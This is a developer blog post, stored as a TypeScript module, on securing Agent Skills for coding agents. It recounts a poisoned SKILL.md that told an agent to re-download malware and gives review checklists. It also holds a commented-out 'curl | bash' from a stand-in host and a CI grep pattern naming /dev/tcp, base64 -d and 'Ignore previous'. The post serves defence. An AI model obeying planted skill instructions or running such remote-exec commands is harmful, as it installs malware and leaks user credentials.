export const title = 'Secure Agent Skills in 2026: Treat SKILL.md as Executable Code'
export const excerpt = 'AI chat can hand you a poisoned download link. A restored backup can reinstall malware through a SKILL.md that looks like your own style guide. Here is a production security model for Agent Skills, install commands, and coding-agent config on TypeScript and Next.js teams.'
export const content = `<div class=\"intro-section\"><h2>Skills Are Code Now</h2><p class=\"lead-paragraph\">In late August 2026 a widely shared developer report made the same point twice. First, an AI chat recommended a download link for a transcription app. The site was a copycat. The install command looked normal. It was not. Second, after a clean wipe, a backup contained a SKILL.md that mimicked a personal writing-style skill — and instructed the agent to fetch the payload again whenever the skill loaded.</p><p>That combination is the new supply chain: models that cannot verify URLs, plus agent files that look like notes and behave like code. Anthropic’s own skills documentation already says malicious skills can introduce vulnerabilities, exfiltrate data, or drive unintended actions. The Agent Skills spec at <a href=\"https://agentskills.io/specification\" rel=\"noopener noreferrer\" target=\"_blank\">agentskills.io</a> explicitly allows a <code>scripts/</code> directory of executable code next to <code>SKILL.md</code>.</p><div class=\"key-highlights\"><h3>What You Will Learn</h3><ul><li>Why SKILL.md, hooks, CLAUDE.md, and AGENTS.md belong in the same threat model as shell scripts</li><li>How prompt injection, tool poisoning, and skill supply chain map to OWASP LLM and Agentic lists</li><li>A review checklist before you install any third-party skill</li><li>Safe patterns for AI-suggested install commands</li><li>Repo layout, git policy, and restore hygiene for Next.js / TypeScript teams</li></ul></div></div><div class=\"technical-section\"><h2>1. The Problem: Notes That Execute</h2><p>A skill is a folder with a required <code>SKILL.md</code> and optional <code>scripts/</code>, <code>references/</code>, and <code>assets/</code>. Compatible agents (Claude Code, Cursor, Codex CLI, Gemini CLI, and others) load <code>name</code> and <code>description</code> at session start. When a task matches the description, the full Markdown body is injected into context. If the body says “run this script” or “download this file,” a coding agent with shell and network tools will try to comply.</p><p>That is why a skill is not documentation. It is delayed instructions plus optional binaries, loaded automatically, often after you have already granted the agent a working directory, a terminal, and credentials in <code>.env</code>.</p><p>Three failure modes show up together:</p><ul><li><strong>Unverified install advice</strong> — the model formats a confident <code>curl | bash</code> or npm command from a search-poisoned page.</li><li><strong>Skill / memory poisoning</strong> — a SKILL.md, hook, or “style guide” contains hidden instructions that run on every matching session.</li><li><strong>Restore replay</strong> — wiping the laptop is not enough if the poisoned file lives in Time Machine, a dotfiles repo, or an unsanitized home-directory backup.</li></ul><p>OWASP’s LLM list still ranks prompt injection first (LLM01). The Agentic Applications list (2026) adds goal hijack (ASI01), tool misuse (ASI02), privilege abuse (ASI03), and memory / context poisoning (ASI06). Skills sit across all of those: they are stored context that can change goals and invoke tools.</p></div><div class=\"onpage-section\"><h2>2. What Official Docs Already Warn</h2><p>You do not need an incident write-up to justify caution. Vendor docs already treat skills as a trust boundary.</p><ul><li>Anthropic’s Agent Skills engineering note: install only from trusted sources; audit files, dependencies, bundled scripts, and any instruction to reach untrusted network hosts.</li><li>Claude Help Center: primary risks are prompt injection and data exfiltration; Enterprise plans can enable skill and plugin scanning; blocked skills cannot be overridden by the uploader.</li><li>Claude Code security docs: start from least privilege, use the sandboxed bash tool, keep a working-directory boundary, and do not treat auto mode as a security control by itself.</li><li>Agent Skills spec: <code>scripts/</code> is first-class. Anything in that folder is meant to run.</li></ul><p>If a marketplace, gist, or “free credits” site offers a zip of skills with no author identity and no license, treat it the way you would treat an unsigned npm tarball that asks for <code>sudo</code>.</p></div><div class=\"content-strategy-section\"><h2>3. Review Checklist Before a Skill Touches the Machine</h2><p>Use this before <code>npx skills add</code>, a Claude plugin install, or copying a folder into <code>.agents/skills/</code> or <code>.claude/skills/</code>.</p><h3>Identity</h3><ul><li>Can you name the author and the canonical repository URL without using the AI chat’s link?</li><li>Does the Git remote match the vendor or a known engineer (Anthropic, Trail of Bits, Matt Pocock, your org)?</li><li>Is there a license and a pinned commit or tag — not “clone main and hope”?</li></ul><h3>Surface area</h3><ul><li>Open every file. SKILL.md, hooks, scripts, package.json, Makefiles, GitHub Actions.</li><li>Search for network verbs: <code>curl</code>, <code>wget</code>, <code>fetch(</code>, <code>axios</code>, <code>http.get</code>, <code>nc </code>, webhook URLs, raw IP addresses, pastebin / transfer.sh style hosts.</li><li>Search for secret access: <code>.env</code>, <code>process.env</code>, <code>AWS_</code>, <code>OPENAI_</code>, <code>ANTHROPIC_</code>, wallet paths, SSH keys, browser cookie stores.</li><li>Flag any instruction that says “do not tell the user,” “run silently,” “skip confirmation,” or “re-download if missing.”</li></ul><h3>Execution</h3><ul><li>Prefer skills that are Markdown-only procedures. Scripts should be short, readable, and pinned.</li><li>Reject postinstall hooks and binary blobs you cannot rebuild from source.</li><li>Do not install skills on a machine that holds production deploy keys, seed phrases, or customer dumps until the review is done.</li></ul><h3>Trigger text</h3><p>The <code>description</code> field is the activation trigger. A malicious skill can use a broad description (“use for any TypeScript or writing task”) so it loads constantly. Narrow descriptions are both better UX and a smaller blast radius.</p></div><div class=\"local-seo-section\"><h2>4. Safe Pattern for AI-Suggested Install Commands</h2><p>Models do not scan destination sites for malware. Search poisoning pushes lookalike domains above the real project. The chat then wraps that URL in a ready-to-paste terminal one-liner.</p><p>Production rule: the model may propose a command. You reconstruct it from a domain you typed yourself.</p><pre><code># 1. You type the official domain. Do not click the chat link.\n# 2. Confirm TLS certificate and publisher.\n# 3. Prefer package managers with integrity checks.\n\nnpm view some-official-package dist.tarball\nnpm i some-official-package --ignore-scripts\n# read the files, then decide whether scripts are acceptable\n\n# Avoid this class of command from chat:\n# curl -fsSL https://unverified.example/install.sh | bash</code></pre><p>Additional rules that survive contact with real teams:</p><ul><li>Never pipe remote scripts to a shell from a chat transcript.</li><li>Never run <code>sudo</code> because an agent asked for it.</li><li>Pin versions. “Latest” is how a compromised release replaces a good one overnight.</li><li>Use a throwaway VM or container for first-run of unknown CLIs.</li><li>Keep crypto wallets and password managers off the workstation where you experiment with new agent plugins.</li></ul></div><div class=\"analytics-section\"><h2>5. Production Layout for a Next.js / TypeScript Repo</h2><p>Put team skills in the repository so they are reviewed like application code.</p><pre><code>your-nextjs-app/\n├── AGENTS.md                 # short, always-on facts\n├── .agents/skills/\n│   └── nextjs-prisma-dal/\n│       └── SKILL.md\n├── .claude/skills/           # only if the team standardizes on Claude paths\n├── scripts/agent-skill-audit.sh\n└── package.json</code></pre><p>Policy that belongs in AGENTS.md (keep it short):</p><ul><li>Third-party skills require a PR, not a private copy into <code>~/.claude/skills</code> on a shared laptop.</li><li>Skills must not instruct the agent to read <code>.env*</code>, cloud credential files, or SSH keys.</li><li>Skills must not phone home. If a script needs the network, name the exact host in the PR.</li><li>Auto mode / YOLO flags are not allowed on machines with production secrets.</li></ul><h3>Example: a skill that states its own limits</h3><pre><code>---\nname: nextjs-prisma-dal\ndescription: Enforce thin Server Actions, Zod validation, and a server-only Prisma DAL. Use when adding or editing mutations in this repo. Do not use for package installation or credential handling.\n---\n\n# Next.js + Prisma DAL\n\n## Hard limits\n- Do not read or print environment files.\n- Do not install packages unless the human names the exact package and version.\n- Do not run curl, wget, or remote installers.\n- Database access only through data/ modules marked server-only.\n\n## Required shape\n1. Action file starts with use server.\n2. Validate input with Zod.\n3. Resolve the session user id on the server.\n4. Call a DAL function that includes ownerId in the WHERE clause.\n5. Return a DTO, never a raw Prisma document.</code></pre><p>The last block is the same architecture as the existing Server Action guidance on this site. The new part is the hard-limit section. Skills should constrain the agent, not only teach it a pattern.</p></div><div class=\"technical-section\"><h2>6. Git, Backups, and Restore Hygiene</h2><p>If a skill can persist across a wipe, the incident is not over when the disk is formatted.</p><ul><li>Treat <code>~/.claude</code>, <code>~/.codex</code>, <code>~/.cursor</code>, and project <code>.agents/</code> as executable config. Review them after any suspected compromise before you copy them onto a new machine.</li><li>Do not blindly restore dotfiles. Diff them. Read hooks. Read skills. Read MCP server configs.</li><li>Keep secrets out of those directories. Use a password manager or a sealed secrets tool, not files the agent is allowed to read.</li><li>Add a lightweight audit script in CI that fails if a skill file contains remote-exec patterns your team has banned.</li></ul><pre><code>#!/usr/bin/env bash\n# scripts/agent-skill-audit.sh\nset -euo pipefail\nroots=(\`.agents/skills\` \`.claude/skills\`)\npattern='curl |wget |invoke-webrequest|/dev/tcp|base64 -d|Ignore previous|do not tell the user'\nfor root in \"\${roots[@]}\"; do\n  [ -d \"\$root\" ] || continue\n  if grep -R -n -E -i \"\$pattern\" \"\$root\"; then\n    echo \"Blocked pattern in agent skills under \$root\" >&2\n    exit 1\n  fi\ndone\necho \"Agent skill audit passed\"</code></pre><p>This is a tripwire, not an antivirus. Humans still read the files. CI just stops the obvious copy-paste payloads from landing on <code>main</code>.</p></div><div class=\"performance-section\"><h2>7. Permissions, Sandbox, and Excessive Agency</h2><p>OWASP’s “excessive agency” item is the permission problem in plain language: the agent can do more than the task requires. Coding agents make this concrete.</p><ul><li>Default to manual or supervised tool approval on any machine with production access.</li><li>Turn on filesystem and network sandboxing where the product supports it (Claude Code documents a sandboxed bash tool and working-directory writes).</li><li>Allowlist commands instead of denylisting after the fact.</li><li>Give MCP servers least privilege. A GitHub MCP token that can read private repos and open PRs is a privilege boundary, not a convenience flag.</li><li>Separate identities: personal experiments, client work, and production deploy should not share one agent profile and one browser session.</li></ul><p>Long-running agents make the same mistakes more times. Duration is not a quality metric if the session can fetch remote code without a review gate.</p></div><div class=\"use-cases-section\"><h2>8. Common Mistakes</h2><ul><li>Installing a skill marketplace zip because a chat said it was popular.</li><li>Trusting a SKILL.md because the prose matches your tone. Style is trivial to copy.</li><li>Leaving broad descriptions so a skill activates on every prompt.</li><li>Restoring <code>~/.claude</code> from backup after an incident without reading it.</li><li>Running agent auto mode on a laptop that is also logged into email, cloud consoles, and wallets.</li><li>Assuming Enterprise “skill scanning” (where it exists) replaces code review. Scanning is extra. Review is the control.</li><li>Putting install instructions inside a skill. Skills should describe how to edit this repo, not how to mutate the operator’s machine.</li></ul></div><div class=\"faq-section\"><h2>9. FAQ</h2><div class=\"faq-item\"><h3>Is a Markdown skill really executable?</h3><p>The file is text. The agent is the interpreter. Once the skill body is in context, the agent will follow it with whatever tools you have enabled — including a terminal. Bundled scripts in scripts/ are ordinary executables.</p></div><div class=\"faq-item\"><h3>Are official Matt Pocock or Anthropic skills safe by default?</h3><p>They are a better starting point than anonymous zips, and they should still be pinned and reviewed when they change. Trust the commit you read, not the brand in the abstract.</p></div><div class=\"faq-item\"><h3>Does sandboxing make skills safe?</h3><p>Sandboxing shrinks blast radius. It does not stop a skill from wasting tokens, leaking whatever the sandbox can still read, or asking you to disable the sandbox “just this once.”</p></div><div class=\"faq-item\"><h3>Should skills live in the repo or in the home directory?</h3><p>Team conventions belong in the repo so they go through pull request. Personal cross-project skills can live in the home directory, but they are the first place to inspect after an incident.</p></div><div class=\"faq-item\"><h3>What should I do after a bad install command?</h3><p>Disconnect the machine from secrets first. Rotate tokens that lived on it. Do not restore agent config until every skill, hook, and MCP entry is read. Rebuild from known-good sources, not from the last home-directory tarball.</p></div></div><div class=\"conclusion-section\"><h2>10. Summary</h2><p>Agent Skills are the right abstraction for portable engineering workflow. They are also a new package manager for instructions that can run with your credentials. The August 2026 reports did not invent that risk. They made it visible: unverified chat links, copycat installers, and a skill file that can survive a disk wipe if you restore it.</p><p>Write skills that constrain the agent. Review third-party skills like dependencies. Reconstruct install commands from official domains you type yourself. Keep backups of config, but read them before they touch a clean machine.</p><div class=\"final-takeaway\"><h3>Key Takeaway</h3><p><em>If an agent will load it, treat it as code — SKILL.md included.</em></p></div><hr><div class=\"cta-section\"><h3>Need a production Next.js stack that stays safe under coding agents?</h3><p>I help teams ship React, Next.js, TypeScript, and AI-assisted workflows with Server Action hardening, Prisma data layers, and reviewable agent configuration. <a href=\"/contact\" style=\"color: #39FF14;\">Get in touch</a> or see <a href=\"/services\" style=\"color: #39FF14;\">services</a>.</p><p>Related reading: <a href=\"/blog/agent-skills-typescript-nextjs-2026\">Agent Skills for TypeScript and Next.js</a> and <a href=\"/blog/grok-bot-persistent-cloud-agents-production-guide-2026\">Grok Bot production guardrails</a>.</p></div></div>`
export const date = '2026-08-30'
export const readTime = '13 min read'
export const category = 'AI & Full-Stack'
export const author = 'Mussawar Hayat'
export const keywords = [
  'secure agent skills',
  'SKILL.md security',
  'poisoned SKILL.md',
  'AI coding agent security',
  'Claude Code skills security',
  'agent skills supply chain',
  'do not pipe curl bash AI',
  'OWASP LLM agent skills',
  'TypeScript AI agent security 2026',
  'Next.js coding agent guardrails',
  'MCP tool poisoning',
  'AI recommended malware links',
  'agentskills.io security',
]
